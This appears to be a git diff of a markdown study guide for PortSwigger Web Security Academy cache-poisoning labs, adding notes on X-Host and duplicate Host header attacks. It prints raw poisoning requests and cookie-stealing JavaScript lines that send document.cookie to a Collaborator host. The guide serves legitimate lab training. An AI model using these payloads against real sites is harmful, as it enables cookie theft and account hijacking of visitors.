@@ -380,13 +380,14 @@ body:document.cookie
   
 ## Web Cache Poison  
 
->Target use **tracking.js** JavaScript, and is vulnerable to **X-Forwarded-Host** header redirecting path, allowing the stealing of cookie by poisoning cache.  
+>Target use **tracking.js** JavaScript, and is vulnerable to **X-Forwarded-Host** or **X-Host** header redirecting path, allowing the stealing of cookie by poisoning cache.
+>***Identify*** the web cache headers in response and the tracking.js script in the page source code. Exploit the vulnerability by hosting JavaScript and injecting the header to poison the cache of the target to redirect a victim visiting.  
 
+![Tracking Source code review](images/tracking-code-review.png)  
+  
 ```html
-GET / HTTP/1.1
-Host: TARGET.web-security-academy.net
-X-Forwarded-Host: exploit-SERVER.exploit-server.net
-
+X-Forwarded-Host: EXPLOIT.net
+X-Host: EXPLOIT.net
 ```  
 
 ![tracking.js](images/tracking.js.png)  
@@ -394,7 +395,7 @@ X-Forwarded-Host: exploit-SERVER.exploit-server.net
 >Hosting on the exploit server, injecting the **X-Forwarded-Host** header in request, and poison the cache until victim hits poison cache.  
 
 ```
- /resources/js/tracking.js 
+/resources/js/tracking.js
 ```  
   
 ![exploit host tracking.js](images/exploit-host-tracking-js.png)  
@@ -430,7 +431,27 @@ GET /?utm_content='/><script>document.location="https://Collaborator.com?c="+doc
 ![cache-collaborator.png](images/cache-collaborator.png)  
 
 [PortSwigger Lab: Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)  
-  
+
+### Poison ambiguous request  
+
+>Adding a second **Host** header with an exploit server, this identify a ambiguous cache vulnerability and routing your request. Notice thast the exploit server in second **Host** header is reflected in an absolute URL used to import a script from ```/resources/js/tracking.js```. 
+
+```html
+GET / HTTP/1.1
+Host: 0a5c003203fe8128c1555f3a007600d0.web-security-academy.net
+Host: exploit-0a99003a0303811bc10e5ec601ad00e7.exploit-server.net
+```
+
+>Host cookie stealer JavaScript point to above path on exploit server.  
+
+```
+document.location='https://Collaborator.com/?cookies='+document.cookie;
+```  
+
+![Ambiguous Hosts](images\ambiguous-hosts.png)  
+
+[PortSwigger Lab: Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)  
+
 ## Host Header Poison - forgot-password
 
 ### Spoof IP Address  
